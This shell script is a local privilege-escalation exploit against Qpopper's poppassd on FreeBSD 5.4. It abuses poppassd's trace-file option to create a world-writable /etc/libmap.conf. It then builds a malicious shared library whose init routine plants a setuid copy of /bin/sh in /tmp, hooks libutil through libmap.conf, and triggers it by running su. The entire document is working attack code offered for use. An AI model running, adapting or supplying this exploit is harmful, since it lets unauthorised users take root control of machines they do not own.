#!/bin/sh
###########################################################################
# FreeBSD Qpopper poppassd latest version local r00t exploit by kcope   ###
# tested on FreeBSD 5.4-RELEASE											###
###########################################################################

POPPASSD_PATH=/usr/local/bin/poppassd
HOOKLIB=libutil.so.4

echo ""
echo "FreeBSD Qpopper poppassd latest version local r00t exploit by kcope"
echo ""
sleep 2
umask 0000
if [ -f /etc/libmap.conf ]; then
echo "OOPS /etc/libmap.conf already exists.. exploit failed!"
exit
fi
cat > program.c << _EOF
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{
  if (!geteuid()) {
  remove("/etc/libmap.conf");
  execl("/bin/sh","sh","-c","/bin/cp /bin/sh /tmp/xxxx ; /bin/chmod +xs /tmp/xxxx",NULL);
  }
}

_EOF
gcc -o program.o -c program.c -fPIC
gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles
cp libno_ex.so.1.0 /tmp/libno_ex.so.1.0
echo "--- Now type ENTER ---"
echo ""
$POPPASSD_PATH -t /etc/libmap.conf
echo $HOOKLIB ../../../../../../tmp/libno_ex.so.1.0 > /etc/libmap.conf
su
if [ -f /tmp/xxxx ]; then
echo "IT'S A ROOTSHELL!!!"
/tmp/xxxx
else
echo "Sorry, exploit failed."
fi
